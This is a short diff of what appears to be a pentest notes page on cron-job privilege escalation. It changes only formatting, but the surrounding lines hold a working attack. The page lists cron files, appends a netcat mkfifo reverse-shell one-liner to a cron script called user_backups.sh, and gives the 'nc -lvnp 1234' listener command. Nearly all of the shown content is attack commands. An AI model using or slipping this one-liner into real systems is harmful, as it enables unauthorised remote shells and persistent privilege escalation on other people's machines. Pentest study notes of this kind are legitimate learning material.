@@ -11,10 +11,12 @@ cat /etc/cron.d/*
 
 _<mark style="background-color:purple;">**add a reverse shell to cronjob**</mark>_
 
+{% code overflow="wrap" %}
 ```powershell
 echo >> user_backups.sh
 echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} 1234 >/tmp/f" >> user_backups.sh
 ```
+{% endcode %}
 
 `nc -lvnp 1234`&#x20;
 
